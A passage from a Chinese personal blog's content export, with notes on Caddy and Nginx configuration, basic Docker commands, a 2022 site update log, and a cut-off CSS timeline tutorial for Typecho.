proxy:</span><br><span class="line"># reverse_proxy localhost:8080</span><br></pre></td></tr></table></figure><p>自动生成证书的位置:<code>$HOME/.caddy</code>或者使用 <code>caddy -log stdout</code> 查看日志输出信息</p><blockquote><p>默认的Caddyfile配置为单个站点配置。且为http协议，因为在配置中显式申明了:80，如果没有显式的申明80端口，默认将使用https协议。</p></blockquote><h2 id="配置多个站点的写法"><a href="#配置多个站点的写法" class="headerlink" title="配置多个站点的写法"></a>配置多个站点的写法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 站点1</span><br><span class="line"># 在配置的虚拟主机域名后使用&#123;&#125;，该主机的所有配置信息包含在&#123;&#125;中。</span><br><span class="line">localhost &#123;</span><br><span class="line">    respond &quot;Hello, world!&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 站点2</span><br><span class="line"># 在配置的虚拟主机域名后使用&#123;&#125;，该主机的所有配置信息包含在&#123;&#125;中。</span><br><span class="line">localhost:2016 &#123;</span><br><span class="line">    respond &quot;Goodbye, world!&quot;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>更多配置项可以参看<a href="https://caddy2.dengxiaolong.com/docs/">官方文档</a>。</p></blockquote><h2 id="Caddyfile-配置文件示例"><a href="#Caddyfile-配置文件示例" class="headerlink" title="Caddyfile 配置文件示例"></a>Caddyfile 配置文件示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">example.com &#123;</span><br><span class="line">  root /var/www/example.com  # 如果不需要在本地放置站点内容，可以不需要。</span><br><span class="line">  gzip</span><br><span class="line">  reverse_proxy /ray localhost:10000 &#123;</span><br><span class="line">    header_up -Origin</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>root &#x2F;var&#x2F;www&#x2F;example.com：example.com 域名指向的网站根目录；</li><li>proxy &#x2F;ray localhost:10000 { … }：将特定的路径请求（这里指发送到&#x2F;ray的请求），转发到主机本地端口10000。</li></ul><p>修改了配置文件后，需要重新就加载caddy服务：<code>systemctl restart caddy.service</code></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Caddy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年网站更新日志</title>
      <link href="/5a717bf0.html"/>
      <url>/5a717bf0.html</url>
      
        <content type="html"><![CDATA[<div class="tip sync"><p>截止2022年，博客魔改版本： <u>1.3.3</u> </p></div><div class="timeline undefined"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-20</p></div></div><div class='timeline-item-content'><p>本站新增时间轴样式，样式预览可以查看更新日志，添加方法可以看这里</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-20</p></div></div><div class='timeline-item-content'><p>新站-山海图册上线了</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-19</p></div></div><div class='timeline-item-content'><p>主题更换为 BearSimple</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-17</p></div></div><div class='timeline-item-content'><p>重新完成服务器内网站结构重建</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-16</p></div></div><div class='timeline-item-content'><p>置入 inis博客系统【新一代博客系统，内置丰富的API系统，自带多端（Web、APP和小程序）的博客系统】</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-30</p></div></div><div class='timeline-item-content'><p>理想城计划已上线，本站诞生的初衷是为了建立一个属于自己的知识库，方便以后再回头查询资料。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-14</p></div></div><div class='timeline-item-content'><p>因网站访问过于缓慢，重新构建博客，使用 Initial 主题</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>9-19</p></div></div><div class='timeline-item-content'><p>置入 MyDiary 主题，本站由 hexo主站 迁移到 typecho 主题为 MyDiary 主题</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>9-7</p></div></div><div class='timeline-item-content'><p>本站已加入又拍云联盟，使用又拍云CDN进行加速</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>9-5</p></div></div><div class='timeline-item-content'><p>清单 <span class='p red'>上线</span> 骑士日记，用于记录自己看过的书单、相册、影单和分享公爵觉得挺不错的书单、相册、影单，同时也会引用豆瓣长评来方便大家了解</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-30</p></div></div><div class='timeline-item-content'><p><span class='p blue'>优化</span>页脚样式<br><span class='p gray'>取消</span>自定义右键</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-27</p></div></div><div class='timeline-item-content'><p><span class='p blue'>优化</span>github calendar插件原api使用的是<code>vercel</code>默认域名，现更新为自建api <code>https://friends.hexo.icu/api</code> ，直接替换原先API即可<br><span class='p blue'>优化</span><code>YesPlayMusic</code> 由 <code>vercel</code> 默认域名 <code>https://yes-play-music-jade-five.vercel.app/</code> 变更为 <code>https://music.hexo.icu/</code><br><span class='p blue'>优化</span><code>每日早报</code> 由 <code>vercel</code> 默认域名 <code>https://gjcloak-news.vercel.app/</code> 变更为 <code>https://news.hexo.icu/</code><br><span class='p blue'>优化</span>页脚样式<br>友圈样式异常，暂时<span class='p gray'>下线</span></p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-26</p></div></div><div class='timeline-item-content'><p><span class='p red'>新增</span>评论框输入提醒<br><span class='p blue'>优化</span>导航菜单居中展示</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-22</p></div></div><div class='timeline-item-content'><p><span class='p blue'>优化</span>由 <code>阿里图标</code> 替换原有的 <code>Font Awesome</code> 图标<br><code>理想城</code>暂时<span class='p gray'>下线</span>，调整内容</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-21</p></div></div><div class='timeline-item-content'><p><span class='p red'>新增</span>自定义右键<br><span class='p blue'>优化</span>部分样式</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-20</p></div></div><div class='timeline-item-content'><p><span class='p blue'>优化</span>部分文章样式<br><span class='p blue'>优化</span>底部按钮</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-18</p></div></div><div class='timeline-item-content'><p><span class='p blue'>优化</span>加载动画</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-15</p></div></div><div class='timeline-item-content'><p>博客使用 <code>vercel</code> 部署海外线路，提高海外访问速度<br><span class='p red'>新增</span>Github Canlendar<br><span class='p red'>新增</span>首页分类展示<br><span class='p red'>新增</span>侧边栏时钟<br><span class='p blue'>优化</span>侧边栏历史上的今天<br><span class='p blue'>优化</span>首页文章双栏布局</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-12</p></div></div><div class='timeline-item-content'><p>博客使用 <code>Algolia</code> 搜索</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-10</p></div></div><div class='timeline-item-content'><p><code>Twikoo</code> 评论系统从 <code>vercel</code> 迁移到自 <code>Docker</code> 部署</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-8</p></div></div><div class='timeline-item-content'><p><span class='p blue'>优化</span>评论区展示样式<br><span class='p blue'>优化</span>首页、侧边栏、分类、归档页样式</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-7</p></div></div><div class='timeline-item-content'><p>友链朋友圈已恢复，可正常访问<br><span class='p red'>新增</span>标签云文章数上下标<br><span class='p blue'>优化</span>统计页面展示效果<br>关闭了部分页面的侧边栏</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-2</p></div></div><div class='timeline-item-content'><p>实验室<span class='p red'>上线</span><a href="https://news.hexo.icu/">每日早报</a></p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>8-1</p></div></div><div class='timeline-item-content'><p><span class='p red'>新增</span>图库页面</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-29</p></div></div><div class='timeline-item-content'><p><span class='p red'>新增</span>功能如下：</p><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>版权声明美化</p>            </div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-27</p></div></div><div class='timeline-item-content'><p><span class='p red'>新增</span>功能如下：</p><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>页脚美化</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>友链界面美化</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>公祭日自动变灰判定</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>站点动态title</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>归档页面年份后面增加十二生肖图标及页面优化</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>首页新增轮播图</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>新增侧边栏历史上的今天</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>新增文章统计页面</p>            </div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-26</p></div></div><div class='timeline-item-content'><p><span class='p red'>新增</span>功能如下：</p><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>评论区美化</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>评论区侧栏弹出</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>新增外挂标签</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>替换hexo自带的markdown渲染插件</p>            </div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-25</p></div></div><div class='timeline-item-content'><p>主题从 Volantis 变更为 Butterfly ，并且使用 twikoo 评论系统替换 Artalk 评论系统，并<strong>新增</strong> RSS 订阅功能</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-24</p></div></div><div class='timeline-item-content'><p>上线 <a href="https://music.hexo.icu/">YesPlayMusic</a><br><img src="https://cos.gjcloak.xyz/pigo/202207241404794.png?imageMogr2/format/webp/interlace/1/quality/80" alt="截图"><br>使用 <a href="https://vercel.com/">Vercel</a> 部署，本站请勿频繁登录已做缓存处理（缓存2分钟，不缓存数据极容易引起网易服务器高频 ip 错误，相同的 url 会在两分钟内只向网易服务器发一次请求），不然可能会被风控</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-21</p></div></div><div class='timeline-item-content'><p>友链朋友圈异常暂时关闭，上线实验室（里面放自己搭建的其他工具或网站）</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-20</p></div></div><div class='timeline-item-content'><p>网站使用自建的 <a href="https://ty.gjcloak.top/">Umami</a> 服务进行数据统计</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-16</p></div></div><div class='timeline-item-content'><p>本站使用 Artalk 评论系统，替换原先的giscus评论系统</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-12</p></div></div><div class='timeline-item-content'><p>由于连续的攻击博客从 halo 迁移到 typecho ，但不止何种原因数据库老是链接失败，现迁移至 hexo，开启“半自动化”的写作生涯</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-10</p></div></div><div class='timeline-item-content'><p>博客服务器受到攻击宕机，重新恢复服务</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-9</p></div></div><div class='timeline-item-content'><p><a href="https://ap.gjcloak.top/">理想城</a> 更新异常，重新进行优化升级完成</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>6-23</p></div></div><div class='timeline-item-content'><p>更名 <code>白鸦庄园</code> 为 <a href="https://ap.gjcloak.top/">理想城</a>，由 Mastodon 变更为 Misskey</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>5-30</p></div></div><div class='timeline-item-content'><p>完成萌国ICP备案，备案号为 <a href="https://icp.gov.moe/?keyword=20226257">萌ICP备20226257号</a></p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>5-16</p></div></div><div class='timeline-item-content'><p><a href="https://ap.gjcloak.top/">白鸦庄园</a> 上线</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>5-15</p></div></div><div class='timeline-item-content'><p>已通过开往申请，将开往的外链，加入顶栏导航和底部导航中，便于访客看到并点击</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>5-6</p></div></div><div class='timeline-item-content'><p>申请加入 <a href="https://github.com/travellings-link/travellings">开往-友链接力 v1.5</a> </p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>4-20</p></div></div><div class='timeline-item-content'><p>上线  <a href="https://www.gjcloak.top/">公爵’s Homepage</a> ,博客地址由<a href="http://www.gjcloak.top/">www.gjcloak.top</a> 变更为 blog.gjcloak.top</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>4-6</p></div></div><div class='timeline-item-content'><p>置入主题handsome</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>4-1</p></div></div><div class='timeline-item-content'><p>公安备案失败了，暂时不备案了。置入一台香港服务器</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>3-21</p></div></div><div class='timeline-item-content'><p>gjcloak.xyz 备案完成，耗时7天，备案号:赣ICP备2022001242号-2，已提交公安备案</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>3-15</p></div></div><div class='timeline-item-content'><p>网站名称 <strong>公爵书房-眼览寰宇，纸记时间</strong> 变更为 <strong>公爵书房|技巧分享-眼览寰宇，纸记时间</strong> </p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>3-14</p></div></div><div class='timeline-item-content'><p>域名备案被退回，视频核验照片背景非纯白色，重新拍摄提交了，这备案网站名没法跟实际的一样，因为会过不去，改其他的又不符合网站，真的难受，早知道入Hong Kong的服务器了，还好晚上通过腾讯的审核，提交工信了</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>3-13</p></div></div><div class='timeline-item-content'><p>域名gjcloak.xyz提交备案</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>3-10</p></div></div><div class='timeline-item-content'><p>新入服务器和域名（gjcloak.xyz）</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>3-9</p></div></div><div class='timeline-item-content'><p><a href="https://blog.gjcloak.top/">公爵书房</a> 从wordpress搬迁至typecho，主题双双变啦，主题H-siren改用主题Joe</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>3-4</p></div></div><div class='timeline-item-content'><p>主题又又更换啦，是H-siren</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2-28</p></div></div><div class='timeline-item-content'><p>主题又更换啦，是Argon</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2-25</p></div></div><div class='timeline-item-content'><p>网站主题更换啦，是sakura；同时本站提交给百度、Yandex、Google、bing进行收录</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2-24</p></div></div><div class='timeline-item-content'><p>公安备案成功，备案号：闽公网安备 35020502000606号</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2-14</p></div></div><div class='timeline-item-content'><p>提交公安备案</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2-11</p></div></div><div class='timeline-item-content'><p>备案成功，备案号：赣ICP备2022001242号-1 ，部署网站，基于wordpress程序、Dashscroll主题</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2-10</p></div></div><div class='timeline-item-content'><p>提交ICP备案</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>1-27</p></div></div><div class='timeline-item-content'><p>购入域名：<a href="https://www.gjcloak.top/">gjcloak.top</a> ，小站起步</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>1-19</p></div></div><div class='timeline-item-content'><p>购入腾讯云轻量应用服务器，小站开始调试</p></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 专栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 更新日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ngnix 配置记录</title>
      <link href="/187.html"/>
      <url>/187.html</url>
      
        <content type="html"><![CDATA[<p>Ngnix的功能非常强大，配置也十分灵活，下面是一些使用用一些常用配置：</p><h3 id="禁止使用IP地址访问网站"><a href="#禁止使用IP地址访问网站" class="headerlink" title="禁止使用IP地址访问网站"></a>禁止使用IP地址访问网站</h3><p>IP地址访问很不友好，但是默认IP的访问是被允许的，以下设置可以禁止通过IP访问服务器网站。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    listen [::]:80 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="仅允许指定用户的IP访问网站"><a href="#仅允许指定用户的IP访问网站" class="headerlink" title="仅允许指定用户的IP访问网站"></a>仅允许指定用户的IP访问网站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 其它配置代码</span><br><span class="line">    location / &#123;</span><br><span class="line">        # 其它配置代码</span><br><span class="line">    # 只允许ip为8.8.8.8的用户进行访问。</span><br><span class="line">    allow 8.8.8.8;</span><br><span class="line">    # 拒绝所有的ip访问，这样设置后，就只有ip为8.8.8.8可以访问网站。拒绝后返回的是403错误</span><br><span class="line">    deny  all;                   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="允许跨域访问及设置白名单域名"><a href="#允许跨域访问及设置白名单域名" class="headerlink" title="允许跨域访问及设置白名单域名"></a>允许跨域访问及设置白名单域名</h3><p>跨域的访问十分普遍，以下设置允许其他域名的跨域访问，同时还进行白名单设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 其它配置代码</span><br><span class="line">    location / &#123;</span><br><span class="line">        # 跨域允许设置，允许所有跨域</span><br><span class="line">        add_header &#x27;Access-Control-Allow-Origin&#x27; *;</span><br><span class="line">        add_header &#x27;Access-Control-Allow-Methods&#x27; &#x27;GET, POST, OPTIONS&#x27;;</span><br><span class="line">        add_header &#x27;Access-Control-Allow-Headers&#x27; &#x27;DNT,web-token,app-token,Authorization,Accept,Origin,Keep-Alive,User-Agent,X-Mx-ReqToken,X-Data-Type,X-Auth-Token,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range&#x27;;</span><br><span class="line">        if ($request_method = &#x27;OPTIONS&#x27;) &#123;# 处理OPTIONS请求</span><br><span class="line">            return 204;</span><br><span class="line">        &#125;</span><br><span class="line">        # 跨域允许设置结束</span><br><span class="line"></span><br><span class="line">        # 防盗链设置，因为上述跨域是允许所有的，这里就要设置防盗链从而进行域名的白名单设置</span><br><span class="line">        valid_referers none blocked *.baidu.com *.sina.com.cn;</span><br><span class="line">        if ($invalid_referer) &#123; #返回一个盗链图片，或直接返回403</span><br><span class="line">            # rewrite ^/ http://ww4.sinaimg.cn/bmiddle/051bbed1gw1egjc4xl7srj20cm08aaa6.jpg;</span><br><span class="line">            return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 如果要将禁止特定后缀文件的盗链，则可将上述代码放在下面里面</span><br><span class="line">        # location ~* \.(jscssgifjpgpngjpeg)$ &#123; </span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反向代理某个域名"><a href="#反向代理某个域名" class="headerlink" title="反向代理某个域名"></a>反向代理某个域名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.yovisun.com; #用户访问的域名</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_pass http://proxy.yovisun.com; # 服务器实际去访问的代理域名</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反向代理某个域名，并在url上追加参数"><a href="#反向代理某个域名，并在url上追加参数" class="headerlink" title="反向代理某个域名，并在url上追加参数"></a>反向代理某个域名，并在url上追加参数</h3><p>下述对&#x2F;avatar&#x2F;目录下的所有文件，都在url后面追加：detail&#x3D;abcd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.yovisun.com; #用户访问的域名</span><br><span class="line">    # 头像图片转接到oss内部</span><br><span class="line">    location ~* /avatar/ &#123;</span><br><span class="line">        add_header backendIP $upstream_addr;</span><br><span class="line">        add_header backendCode $upstream_status;</span><br><span class="line">        set $delimeter &quot;&quot;;</span><br><span class="line">        if ($is_args) &#123;</span><br><span class="line">            set $delimeter &quot;&amp;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        set $args $args$&#123;delimeter&#125;detail=abcd;</span><br><span class="line">        proxy_pass http://proxy.yovisun.com;</span><br><span class="line">        proxy_set_header Host www.yovisun.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="http（80端口）的链接301跳转到对应的https（443）"><a href="#http（80端口）的链接301跳转到对应的https（443）" class="headerlink" title="http（80端口）的链接301跳转到对应的https（443）"></a>http（80端口）的链接301跳转到对应的https（443）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.域名.com;</span><br><span class="line">    rewrite ^(.*)$ https://$&#123;server_name&#125;$1 permanent; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> niginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 基础操作</title>
      <link href="/186.html"/>
      <url>/186.html</url>
      
        <content type="html"><![CDATA[<h2 id="列出所有容器-ID"><a href="#列出所有容器-ID" class="headerlink" title="列出所有容器 ID"></a>列出所有容器 ID</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -aq</span><br></pre></td></tr></table></figure><h2 id="停止所有容器"><a href="#停止所有容器" class="headerlink" title="停止所有容器"></a>停止所有容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -aq)</span><br></pre></td></tr></table></figure><h2 id="停止单个容器"><a href="#停止单个容器" class="headerlink" title="停止单个容器"></a>停止单个容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 要停止的容器名</span><br></pre></td></tr></table></figure><h2 id="删除所有容器"><a href="#删除所有容器" class="headerlink" title="删除所有容器"></a>删除所有容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><h2 id="删除单个容器"><a href="#删除单个容器" class="headerlink" title="删除单个容器"></a>删除单个容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm 要删除的容器名</span><br></pre></td></tr></table></figure><h2 id="删除所有的镜像"><a href="#删除所有的镜像" class="headerlink" title="删除所有的镜像"></a>删除所有的镜像</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho添加时间轴</title>
      <link href="/179.html"/>
      <url>/179.html</url>
      
        <content type="html"><![CDATA[<p>喜欢那种时间的错落感，时间轴无疑能很好地表现出来。</p><p>首先看下效果</p><ol><li><strong>2020年01月</strong>事件3</li><li><strong>2019年01月</strong>事件2</li><li><strong>2018年12月</strong>事件1</li></ol><p>这样放在关于页面用于写博客发展历程岂不美哉</p><p>{cat_hide}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* 站点动态时间轴 */</span><br><span class="line">#teamnewslist ol&#123;list-style:none;margin-left: 36px;padding-left: 14px;border-left: 2px solid #eee;font-size: 18px;color: #666;&#125;</span><br><span class="line">#teamnewslist b&#123;font-size: 12px;font-weight: normal;color: #999;display: block;position: relative;margin-bottom:5px;&#125;</span><br><span class="line">#teamnewslist b::after&#123;position: absolute;top: 6px;left: -22px;content: &#x27;&#x27;;width: 14px;height: 14px;border-radius: 50%;background-color: #fff;border: 2px solid #ccc;box-shadow: 2px 2px 0 rgba(255,255,255,1), -2px -2px 0 rgba(255,255,255,1)&#125;</span><br><span class="line">#teamnewslist li&#123;list-style:none;margin: 0 0 20px 0;line-height: 100%;&#125;</span><br><span class="line">#teamnewslist li:hover&#123;color: #555;&#125;</span><br><span class="line">#teamnewslist li:hover b::after&#123;border-color: #C01E22;&#125;</span><br><span class="line">#teamnewslist li:hover b&#123;color: #C01E22;&#125;</span><br></pre></td></tr></table></figure><p>{&#x2F;cat_hide}</p><p>将上面代码放在主题的自定义CSS里有些主题自定义css不生效那就把这段CSS放到你要放的文章页面里并用两个!!!包住使之生效，在编辑页面或文章时，然后按以下格式编辑内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;teamnewslist&quot;&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li&gt;&lt;b&gt;2019年01月&lt;/b&gt;以姓名代码3328更换新域名3328bk.cn并作为本博客域名永久使用&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;b&gt;2018年12月&lt;/b&gt;使用 Wordpress 搭建了博客并命名某良博客，并购买了第一个主题mkblog&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span 